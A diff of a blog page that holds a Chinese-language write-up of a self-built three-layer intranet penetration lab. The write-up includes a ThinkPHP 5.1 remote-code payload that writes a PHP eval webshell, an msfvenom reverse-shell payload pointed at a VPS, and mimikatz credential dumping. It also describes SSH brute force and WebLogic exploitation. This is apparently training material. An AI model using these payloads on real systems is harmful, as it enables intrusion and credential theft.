@@ -21,7 +21,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201215222619.png">
 <meta property="article:published_time" content="2020-12-12T04:00:00.000Z">
-<meta property="article:modified_time" content="2020-12-15T14:58:21.882Z">
+<meta property="article:modified_time" content="2020-12-24T13:25:25.715Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="内网穿透">
@@ -196,7 +196,7 @@ var _hmt = _hmt || [];
 <div class="article-date">
   <i class="fa fa-calendar-plus-o"></i>
   <a href="/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" class="article-date">
-     <time datetime="2020-12-15T14:58:21.882Z" itemprop="dateModified">2020-12-15</time>
+     <time datetime="2020-12-24T13:25:25.715Z" itemprop="dateModified">2020-12-24</time>
   </a>
 </div>
 
@@ -235,28 +235,28 @@ var _hmt = _hmt || [];
 
 <p>目录扫描</p>
 <p>dirsearch</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128120642.png" alt="20201128120642"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128120642.png" alt=""></p>
 <p>扫出不少目录</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201215220844.png" alt="20201215220844"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201215220844.png" alt=""></p>
 <p>通过浏览器访问发现是用 Thinkphp 5.1 搭建的网站，这个版本有 exp 可以直接打</p>
 <p>查看 phpinfo</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
 
 <p>获取到网站根目录</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128122100.png" alt="20201128122100"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122100.png" alt=""></p>
 <p>写 webshell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;lipei.php&amp;vars[1][]&#x3D;&lt;?php @eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>写入后的路径在 <a href="http://xxx.xxx.x.xx:2780/public/lipei.php" target="_blank" rel="noopener">http://xxx.xxx.x.xx:2780/public/lipei.php</a></p>
 <p>蚁剑连接成功</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128122243.png" alt="20201128122243"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122243.png" alt=""></p>
 <p><code>whoami</code> 发现直接就是 system 权限，不用提权了，成功拿下第一个机器</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128122358.png" alt="20201128122358"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122358.png" alt=""></p>
 <p>内网探测</p>
 <p><code>ipconfig</code> 查看 IP，发现当前机器的内网 IP 是 <code>172.26.2.182</code>，前面通过浏览器访问的是映射出去的外网 IP</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128122607.png" alt="20201128122607"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122607.png" alt=""></p>
 <p>测试的时候不知为何蚁剑频繁报错卡住，改用 msf 上线吧</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128125526.png" alt="20201128125526"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128125526.png" alt=""></p>
 <p>生成 exe 木马并上传到目标机器（lhost 是 VPS 公网 IP）</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=49.xxx.xx.xxx lport=5555 -f exe &gt; pei_1.exe</span><br></pre></td></tr></table></figure>
 
@@ -264,15 +264,15 @@ var _hmt = _hmt || [];
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 127.0.0.1</span><br><span class="line">lhost =&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> exitonsession <span class="literal">false</span> </span><br><span class="line">exitonsession =&gt; <span class="literal">false</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run -j</span><br></pre></td></tr></table></figure>
 
 <p>在蚁剑上启动木马，上线成功</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128131702.png" alt="20201128131702"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128131702.png" alt=""></p>
 <p>使用 mimikatz 获取明文密码</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz <span class="comment"># 加载 mimikatz 模块</span></span><br><span class="line">wdigest <span class="comment"># 获取明文密码</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="http://my.lipeilipei.top/images/2020/20201128132927.png" alt="20201128132927"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128132927.png" alt=""></p>
 <p>明文获取失败，哦前面上传木马的是 32 位的，系统是 64 位的</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128133319.png" alt="20201128133319"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128133319.png" alt=""></p>
 <p>把进程注入到一个 64 位的以管理员权限运行的程序中，再获取明文</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128133943.png" alt="20201128133943"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128133943.png" alt=""></p>
 <p>得到一个账号</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator  root</span><br></pre></td></tr></table></figure>
 
@@ -281,14 +281,14 @@ var _hmt = _hmt || [];
 <p>下面对内网的探测都需要设置好用 frp 搭建好的 socks 通道，win 上使用 <code>socksCap64</code> 等工具，linux 可以使用 <code>proxychains</code> 等工具</p>
 </blockquote>
 <p>手动创建一个管理员账号，可以成功登录</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128181153.png" alt="20201128181153"></p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128181324.png" alt="20201128181324"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128181153.png" alt=""></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128181324.png" alt=""></p>
 <p>使用 ping 命令探测一下同网段存活机器</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,255) do @ ping 172.26.2.%i -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot;</span><br></pre></td></tr></table></figure>
 <p>在目标机器执行上面这条命令不知道为什么一直没有结果，于是上传一个 nbtscan.exe 到目标机器来扫描，探测到在两个网段内除本机之外的另外两个机器</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128145812.png" alt="20201128145812"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128145812.png" alt=""></p>
 <p><code>arp -a</code> 命令查看 arp 缓存发现两个网段内还有如下机器</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128184423.png" alt="20201128184423"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128184423.png" alt=""></p>
 <p>再用 msf 的探测模块扫描了一番，最终整理一下，发现当前内网其他机器有五个</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.26.2.28</span><br><span class="line">172.26.2.174</span><br><span class="line">172.26.3.18</span><br><span class="line">172.26.3.75</span><br><span class="line">172.26.3.78</span><br></pre></td></tr></table></figure>
 
@@ -300,29 +300,29 @@ var _hmt = _hmt || [];
 
 
 <p>发现里面有三个机器开了 22 端口，爆破一下 ssh，果然有一台 172.26.2.28 是弱口令</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128192904.png" alt="20201128192904"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128192904.png" alt=""></p>
 <p>ssh 登录成功，是一台 kali，成功拿下第二个机器</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128193426.png" alt="20201128193426"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128193426.png" alt=""></p>
 <h2 id="目标机器二：172-26-2-174-172-26-3-18"><a href="#目标机器二：172-26-2-174-172-26-3-18" class="headerlink" title="目标机器二：172.26.2.174 / 172.26.3.18"></a>目标机器二：172.26.2.174 / 172.26.3.18</h2><p>发现同网段另一个机器 172.26.2.174 和 172.26.3.18 都开放了 445 端口，测试一下 17-010 漏洞</p>
 <p>确定这两个都存在 17010 漏洞</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128154016.png" alt="20201128154016"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128154016.png" alt=""></p>
 <p>但是尝试了几次都是攻击失败</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128160219.png" alt="20201128160219"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128160219.png" alt=""></p>
 <p>这俩机器还开了 3389 端口，通过 socks 通道打开远程桌面连接工具，使用前面收集到的那个密码试一下，额，都登录失败，密码好像不对</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201128161356.png" alt="20201128161356"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128161356.png" alt=""></p>
 <h2 id="目标机器三：172-26-3-78"><a href="#目标机器三：172-26-3-78" class="headerlink" title="目标机器三：172.26.3.78"></a>目标机器三：172.26.3.78</h2><p>这个机器开放了 7001 端口，是 weblogic 的默认端口，浏览器挂好代理访问发现确实是 weblogic 默认的 404 页面</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201129135402.png" alt="20201129135402"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129135402.png" alt=""></p>
 <p>经过探测存在几个 CVE 漏洞</p>
-<p><img src="http://my.lipeilipei.top/images/2020/20201129135233.png" alt="20201129135233"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129135233.png" alt=""></p>
 <p>访问 weblogic 的默认登录页面，版本是 10.3.6，后台语言是 jsp</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console&#x2F;login&#x2F;LoginForm.jsp</span><br></pre></td></tr></table></figure>
-<p><img src="http://my.lipeilipei.top/images/2020/20201129142341.png" alt="20201129142341"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129142341.png" alt=""></p>
 <p>CVE-2019-2725 来手工验证，确实存在</p>
 <p><img src="http://my.lipeilipei.top/images/2020/9FA90A9642C33200413AD04ED604B525.jpg" alt=""></p>
 <p>上传冰蝎的 jsp 马</p>
 <p><img src="http://my.lipeilipei.top/images/2020/QQ%E5%9B%BE%E7%89%8720201201202814.png" alt=""></p>
 <p>webshell 连接成功，是 root 权限，拿下第三台机器</p>
-<p><img src="http://my.lipeilipei.top/images/2020/12wqeqwe.png" alt="12wqeqwe"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/12wqeqwe.png" alt=""></p>
 <p>这个机器还存在 172.26.4.0/24 网段，先记录下来</p>
 <h2 id="目标机器四：172-26-3-75"><a href="#目标机器四：172-26-3-75" class="headerlink" title="目标机器四：172.26.3.75"></a>目标机器四：172.26.3.75</h2><p>这个机器开放了 8080 端口，是个 web 服务</p>
 <p><img src="http://my.lipeilipei.top/images/2020/EDEA53BD959197B405B01F7327A22B63.jpg" alt=""></p>
@@ -362,7 +362,7 @@ var _hmt = _hmt || [];
 <p><img src="http://my.lipeilipei.top/images/2020/FD34DF87C3497B32BAD8D6088504AC98.png" alt=""></p>
 <p>蚁剑设置好代理，连接 webshell，命令执行发现是 system权限，成功拿下第五台机器</p>
 <p><img src="http://my.lipeilipei.top/images/2020/B5609320DA5DC631012503C2D9735382.jpg" alt=""></p>
-<h2 id="整理一下网络拓扑图"><a href="#整理一下网络拓扑图" class="headerlink" title="整理一下网络拓扑图"></a>整理一下网络拓扑图</h2><p><img src="http://my.lipeilipei.top/images/2020/20201215222619.png" alt="20201215222619"></p>
+<h2 id="整理一下网络拓扑图"><a href="#整理一下网络拓扑图" class="headerlink" title="整理一下网络拓扑图"></a>整理一下网络拓扑图</h2><p><img src="http://my.lipeilipei.top/images/2020/20201215222619.png" alt=""></p>
 
         </div>
         <footer class="article-footer">
@@ -421,7 +421,7 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
         "genre": "安全",
         "datePublished": "2020-12-12",
         "dateCreated": "2020-12-12",
-        "dateModified": "2020-12-15",
+        "dateModified": "2020-12-24",
         "url": "http://yoursite.com/2020/12/12/渗透三层内网/",
         "description": "前言最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。
 准备工作
